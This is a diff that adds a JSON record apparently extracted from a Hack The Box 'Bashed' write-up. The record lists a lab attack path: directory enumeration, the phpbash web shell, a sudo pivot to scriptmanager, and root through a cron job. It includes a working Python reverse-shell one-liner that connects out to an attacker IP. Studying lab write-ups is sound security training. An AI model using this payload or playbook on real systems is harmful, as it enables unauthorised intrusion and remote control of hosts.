@@ -1,0 +1,82 @@
+{
+  "writeup": "Htb Bashed.md",
+  "extraction": {
+    "scenario_fingerprint": {
+      "scenario_name": "phpbash_shell_exploitation",
+      "primary_services": [
+        "http"
+      ],
+      "port_signature": "80",
+      "os_family": "linux",
+      "environment_type": "web_app",
+      "entry_vector": "phpbash_web_shell",
+      "privilege_path": "sudo_scriptmanager_to_root_via_cron",
+      "attack_complexity": "easy",
+      "estimated_time": "30_minutes_to_1_hour",
+      "scenario_confidence": 0.9
+    },
+    "success_patterns": {
+      "primary_technique": {
+        "technique": "web_shell_access_via_phpbash",
+        "success_reason": "phpbash shell was accessible through the web interface",
+        "success_probability": 0.8,
+        "recognition_signs": [
+          "presence_of_phpbash",
+          "accessible_web_shell"
+        ],
+        "prerequisites": [
+          "web_server_running",
+          "phpbash_installed"
+        ]
+      },
+      "key_discovery": {
+        "discovery": "cron_job_executing_scripts_as_root",
+        "discovery_method": "manual_inspection_of_crontab",
+        "why_critical": "allowed_execution_of_malicious_scripts_as_root"
+      }
+    },
+    "technique_commands": [
+      {
+        "command": "gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt",
+        "tool": "gobuster",
+        "purpose": "directory enumeration",
+        "success_indicator": "discovery_of_/dev_directory"
+      },
+      {
+        "command": "sudo -u scriptmanager /bin/bash",
+        "tool": "sudo",
+        "purpose": "privilege escalation to scriptmanager",
+        "success_indicator": "shell_access_as_scriptmanager"
+      },
+      {
+        "command": "echo \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.157\\\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\" > .exploit.py",
+        "tool": "echo",
+        "purpose": "create reverse shell script",
+        "success_indicator": "reverse_shell_execution_as_root"
+      }
+    ],
+    "applicability_rules": {
+      "when_applicable": [
+        "phpbash_installed",
+        "cron_job_executing_scripts"
+      ],
+      "success_indicators": [
+        "web_shell_access",
+        "cron_execution_as_root"
+      ],
+      "failure_modes": [
+        "phpbash_not_accessible",
+        "no_cron_job_found"
+      ]
+    }
+  },
+  "quality_scores": {
+    "completeness": 1.0,
+    "accuracy": 1.0,
+    "actionability": 1.0,
+    "specificity": 1.0,
+    "overall": 1.0
+  },
+  "model": "gpt-4o",
+  "timestamp": "2025-07-03T14:54:32.989540"
+}
